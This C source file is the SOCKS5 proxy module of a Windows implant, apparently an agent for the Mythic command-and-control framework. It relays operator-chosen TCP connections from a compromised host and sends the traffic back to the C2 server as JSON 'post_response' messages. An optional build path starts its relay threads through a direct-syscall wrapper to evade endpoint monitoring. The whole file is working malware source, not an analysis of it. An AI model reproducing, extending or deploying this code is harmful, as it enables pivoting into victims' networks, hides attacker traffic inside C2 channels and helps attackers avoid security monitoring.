#define _WIN32_WINNT 0x0600
#ifdef INCLUDE_CMD_SOCKS

#include "socks.h"
#include "utils.h"
#ifdef EVASION_SYSCALLS
#include "evasion.h"
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib")

// ---------------------------------------------------------------------------
// Constantes SOCKS5
// ---------------------------------------------------------------------------
#define SOCKS5_VERSION      0x05
#define SOCKS5_NOAUTH       0x00
#define SOCKS5_CMD_CONNECT  0x01
#define SOCKS5_ATYP_IPV4   0x01
#define SOCKS5_ATYP_FQDN   0x03
#define SOCKS5_ATYP_IPV6   0x04
#define SOCKS5_REP_OK       0x00
#define SOCKS5_REP_FAIL     0x01

#define SOCKS_MAX_CONNS   32
#define SOCKS_RECV_BUF  16384

// ---------------------------------------------------------------------------
// Connection states
// ---------------------------------------------------------------------------
#define CONN_FREE    0
#define CONN_METHOD  1   // Waiting for method negotiation
#define CONN_CMD     2   // Attente commande CONNECT
#define CONN_RELAY   3   // Relay actif
#define CONN_CLOSING 4

// ---------------------------------------------------------------------------
// Structure d'une connexion SOCKS
// ---------------------------------------------------------------------------
typedef struct {
    int     server_id;
    SOCKET  sock;
    int     state;
    HANDLE  thread;
    volatile int close_req;

    // Input from Mythic -> target (protected by in_lock)
    CRITICAL_SECTION in_lock;
    unsigned char   *in_buf;
    size_t           in_len;
    size_t           in_cap;
    HANDLE           in_event;  // signaled when in_buf has data
} SocksConn;

static SocksConn  g_conns[SOCKS_MAX_CONNS];
static CRITICAL_SECTION g_conns_lock;
static int g_wsa_ok = 0;

// ---------------------------------------------------------------------------
// File de sortie (target → Mythic)
// ---------------------------------------------------------------------------
typedef struct OutDg {
    int    server_id;
    char  *data_b64;  // NULL si exit
    int    exit_flag;
    struct OutDg *next;
} OutDg;

static OutDg           *g_out_head = NULL;
static OutDg           *g_out_tail = NULL;
static CRITICAL_SECTION g_out_lock;

// ---------------------------------------------------------------------------
// Helpers file de sortie
// ---------------------------------------------------------------------------
static void enqueue_out(int server_id, const unsigned char *data, size_t len, int exit_flag) {
    OutDg *dg = (OutDg *)malloc(sizeof(OutDg));
    if (!dg) return;
    dg->server_id = server_id;
    dg->exit_flag = exit_flag;
    dg->next      = NULL;
    if (data && len > 0)
        dg->data_b64 = base64_encode(data, len);
    else
        dg->data_b64 = NULL;

    EnterCriticalSection(&g_out_lock);
    if (g_out_tail) g_out_tail->next = dg;
    else            g_out_head = dg;
    g_out_tail = dg;
    LeaveCriticalSection(&g_out_lock);
}

// ---------------------------------------------------------------------------
// Thread de relay : target → Mythic
// ---------------------------------------------------------------------------
static DWORD WINAPI relay_thread(LPVOID arg) {
    SocksConn *c = (SocksConn *)arg;
    unsigned char buf[SOCKS_RECV_BUF];

    while (!c->close_req) {
        // Wait for data on socket with timeout
        fd_set rfds;
        FD_ZERO(&rfds);
        FD_SET(c->sock, &rfds);
        struct timeval tv = {0, 50000}; // 50ms
        int r = select(0, &rfds, NULL, NULL, &tv);

        if (r > 0 && FD_ISSET(c->sock, &rfds)) {
            int n = recv(c->sock, (char *)buf, sizeof(buf), 0);
            if (n <= 0) {
                // Socket closed by remote server
                enqueue_out(c->server_id, NULL, 0, 1);
                break;
            }
            enqueue_out(c->server_id, buf, (size_t)n, 0);
        } else if (r < 0) {
            enqueue_out(c->server_id, NULL, 0, 1);
            break;
        }

        // Send pending data from Mythic -> target
        WaitForSingleObject(c->in_event, 0);
        EnterCriticalSection(&c->in_lock);
        if (c->in_len > 0) {
            send(c->sock, (char *)c->in_buf, (int)c->in_len, 0);
            c->in_len = 0;
        }
        LeaveCriticalSection(&c->in_lock);
    }

    closesocket(c->sock);
    c->sock  = INVALID_SOCKET;
    c->state = CONN_FREE;
    return 0;
}

// ---------------------------------------------------------------------------
// Gestion de la table de connexions
// ---------------------------------------------------------------------------
static SocksConn *find_conn(int server_id) {
    for (int i = 0; i < SOCKS_MAX_CONNS; i++) {
        if (g_conns[i].state != CONN_FREE && g_conns[i].server_id == server_id)
            return &g_conns[i];
    }
    return NULL;
}

static SocksConn *alloc_conn(int server_id) {
    for (int i = 0; i < SOCKS_MAX_CONNS; i++) {
        if (g_conns[i].state == CONN_FREE) {
            SocksConn *c = &g_conns[i];
            c->server_id  = server_id;
            c->sock       = INVALID_SOCKET;
            c->thread     = NULL;
            c->close_req  = 0;
            c->in_buf     = NULL;
            c->in_len     = 0;
            c->in_cap     = 0;
            c->state      = CONN_METHOD;
            InitializeCriticalSection(&c->in_lock);
            c->in_event = CreateEvent(NULL, FALSE, FALSE, NULL);
            return c;
        }
    }
    return NULL;
}

static void free_conn(SocksConn *c) {
    c->close_req = 1;
    if (c->thread) {
        WaitForSingleObject(c->thread, 2000);
        CloseHandle(c->thread);
        c->thread = NULL;
    }
    if (c->sock != INVALID_SOCKET) {
        closesocket(c->sock);
        c->sock = INVALID_SOCKET;
    }
    if (c->in_event) {
        CloseHandle(c->in_event);
        c->in_event = NULL;
    }
    DeleteCriticalSection(&c->in_lock);
    free(c->in_buf);
    c->in_buf  = NULL;
    c->in_len  = 0;
    c->in_cap  = 0;
    c->state   = CONN_FREE;
}

// ---------------------------------------------------------------------------
// Traitement SOCKS5
// ---------------------------------------------------------------------------

// Reply to method datagram: [0x05, 0x00] (no-auth)
static void handle_method(SocksConn *c, const unsigned char *data, size_t len) {
    if (len < 2 || data[0] != SOCKS5_VERSION) {
        enqueue_out(c->server_id, NULL, 0, 1);
        free_conn(c);
        return;
    }
    unsigned char reply[2] = { SOCKS5_VERSION, SOCKS5_NOAUTH };
    enqueue_out(c->server_id, reply, 2, 0);
    c->state = CONN_CMD;
}

// Traiter la commande CONNECT et lancer le relay
static void handle_connect(SocksConn *c, const unsigned char *data, size_t len) {
    if (len < 7 || data[0] != SOCKS5_VERSION || data[1] != SOCKS5_CMD_CONNECT) {
        unsigned char fail[10] = { SOCKS5_VERSION, SOCKS5_REP_FAIL, 0, 1, 0,0,0,0, 0,0 };
        enqueue_out(c->server_id, fail, 10, 0);
        enqueue_out(c->server_id, NULL, 0, 1);
        free_conn(c);
        return;
    }

    unsigned char atyp = data[3];
    char  host[256] = {0};
    int   port = 0;

    if (atyp == SOCKS5_ATYP_IPV4) {
        if (len < 10) goto fail;
        snprintf(host, sizeof(host), "%u.%u.%u.%u", data[4], data[5], data[6], data[7]);
        port = (data[8] << 8) | data[9];
    } else if (atyp == SOCKS5_ATYP_FQDN) {
        unsigned char fqdn_len = data[4];
        if (len < (size_t)(5 + fqdn_len + 2)) goto fail;
        memcpy(host, &data[5], fqdn_len);
        host[fqdn_len] = '\0';
        port = (data[5 + fqdn_len] << 8) | data[6 + fqdn_len];
    } else if (atyp == SOCKS5_ATYP_IPV6) {
        if (len < 22) goto fail;
        // Convertir IPv6 bytes en string
        struct in6_addr addr6;
        memcpy(&addr6, &data[4], 16);
        inet_ntop(AF_INET6, &addr6, host, sizeof(host));
        port = (data[20] << 8) | data[21];
    } else {
        goto fail;
    }

    // Resolve and connect
    struct addrinfo hints = {0}, *res = NULL;
    hints.ai_family   = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    char port_str[8];
    snprintf(port_str, sizeof(port_str), "%d", port);

    if (getaddrinfo(host, port_str, &hints, &res) != 0 || !res) goto fail;

    SOCKET s = socket(res->ai_family, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) { freeaddrinfo(res); goto fail; }

    if (connect(s, res->ai_addr, (int)res->ai_addrlen) != 0) {
        closesocket(s);
        freeaddrinfo(res);
        goto fail;
    }
    freeaddrinfo(res);

    c->sock = s;
    c->state = CONN_RELAY;

    // SOCKS5 success response: [0x05, 0x00, 0x00, 0x01, 0,0,0,0, 0,0]
    unsigned char ok[10] = { SOCKS5_VERSION, SOCKS5_REP_OK, 0, SOCKS5_ATYP_IPV4, 0,0,0,0, 0,0 };
    enqueue_out(c->server_id, ok, 10, 0);

    // Lancer le thread de relay
#ifdef EVASION_SYSCALLS
    c->thread = NULL;
    kratos_NtCreateThreadEx(&c->thread, THREAD_ALL_ACCESS, NULL,
                             GetCurrentProcess(), (PVOID)relay_thread, c,
                             0, 0, 0, 0, NULL);
#else
    c->thread = CreateThread(NULL, 0, relay_thread, c, 0, NULL);
#endif
    if (!c->thread) {
        closesocket(c->sock);
        c->sock  = INVALID_SOCKET;
        c->state = CONN_FREE;
        enqueue_out(c->server_id, NULL, 0, 1);
    }
    return;

fail:;
    unsigned char fail_rep[10] = { SOCKS5_VERSION, SOCKS5_REP_FAIL, 0, SOCKS5_ATYP_IPV4, 0,0,0,0, 0,0 };
    enqueue_out(c->server_id, fail_rep, 10, 0);
    enqueue_out(c->server_id, NULL, 0, 1);
    free_conn(c);
}

// ---------------------------------------------------------------------------
// API publique
// ---------------------------------------------------------------------------
void socks_init(void) {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) == 0)
        g_wsa_ok = 1;
    InitializeCriticalSection(&g_conns_lock);
    InitializeCriticalSection(&g_out_lock);
    memset(g_conns, 0, sizeof(g_conns));
    for (int i = 0; i < SOCKS_MAX_CONNS; i++) {
        g_conns[i].state = CONN_FREE;
        g_conns[i].sock  = INVALID_SOCKET;
    }
}

void socks_shutdown(void) {
    EnterCriticalSection(&g_conns_lock);
    for (int i = 0; i < SOCKS_MAX_CONNS; i++) {
        if (g_conns[i].state != CONN_FREE)
            free_conn(&g_conns[i]);
    }
    LeaveCriticalSection(&g_conns_lock);
    if (g_wsa_ok) WSACleanup();
}

void socks_handle_incoming(int server_id, const char *data_b64, int exit_flag) {
    EnterCriticalSection(&g_conns_lock);

    if (exit_flag) {
        SocksConn *c = find_conn(server_id);
        if (c) free_conn(c);
        LeaveCriticalSection(&g_conns_lock);
        return;
    }

    // Decode the datagram
    size_t raw_len = 0;
    unsigned char *raw = NULL;
    if (data_b64 && data_b64[0] != '\0')
        raw = base64_decode_bin(data_b64, strlen(data_b64), &raw_len);

    if (!raw || raw_len == 0) {
        free(raw);
        LeaveCriticalSection(&g_conns_lock);
        return;
    }

    SocksConn *c = find_conn(server_id);

    if (!c) {
        // Nouvelle connexion
        c = alloc_conn(server_id);
        if (!c) {
            free(raw);
            LeaveCriticalSection(&g_conns_lock);
            return;
        }
    }

    switch (c->state) {
        case CONN_METHOD:
            handle_method(c, raw, raw_len);
            break;

        case CONN_CMD:
            handle_connect(c, raw, raw_len);
            break;

        case CONN_RELAY:
            // Envoyer directement au thread de relay via le buffer in_buf
            EnterCriticalSection(&c->in_lock);
            if (c->in_len + raw_len > c->in_cap) {
                size_t new_cap = c->in_len + raw_len + 4096;
                unsigned char *tmp = (unsigned char *)realloc(c->in_buf, new_cap);
                if (tmp) { c->in_buf = tmp; c->in_cap = new_cap; }
            }
            if (c->in_buf && c->in_len + raw_len <= c->in_cap) {
                memcpy(c->in_buf + c->in_len, raw, raw_len);
                c->in_len += raw_len;
                SetEvent(c->in_event);
            }
            LeaveCriticalSection(&c->in_lock);
            break;

        default:
            break;
    }

    free(raw);
    LeaveCriticalSection(&g_conns_lock);
}

void socks_send_pending(void) {
    EnterCriticalSection(&g_out_lock);
    if (!g_out_head) {
        LeaveCriticalSection(&g_out_lock);
        return;
    }

    // Construire le JSON : {"action":"post_response","responses":[],"socks":[...]}
    size_t buf_cap = 4096;
    char  *buf     = (char *)malloc(buf_cap);
    if (!buf) {
        LeaveCriticalSection(&g_out_lock);
        return;
    }

    strcpy(buf, "{\"action\":\"post_response\",\"responses\":[],\"socks\":[");
    size_t pos     = strlen(buf);
    int    first   = 1;
    OutDg *dg      = g_out_head;

    while (dg) {
        const char *b64 = dg->data_b64 ? dg->data_b64 : "";
        size_t need = strlen(b64) + 64;
        if (pos + need + 8 > buf_cap) {
            buf_cap = pos + need + 1024;
            char *tmp = (char *)realloc(buf, buf_cap);
            if (!tmp) break;
            buf = tmp;
        }
        if (!first) buf[pos++] = ',';
        first = 0;
        pos += snprintf(buf + pos, buf_cap - pos,
                        "{\"server_id\":%d,\"data\":\"%s\",\"exit\":%s}",
                        dg->server_id, b64, dg->exit_flag ? "true" : "false");
        dg = dg->next;
    }

    // Free the queue
    dg = g_out_head;
    while (dg) {
        OutDg *next = dg->next;
        free(dg->data_b64);
        free(dg);
        dg = next;
    }
    g_out_head = g_out_tail = NULL;
    LeaveCriticalSection(&g_out_lock);

    strcat(buf, "]}");

    char *resp = send_c2_message(buf);
    if (resp) free(resp);
    free(buf);
}

#endif // INCLUDE_CMD_SOCKS
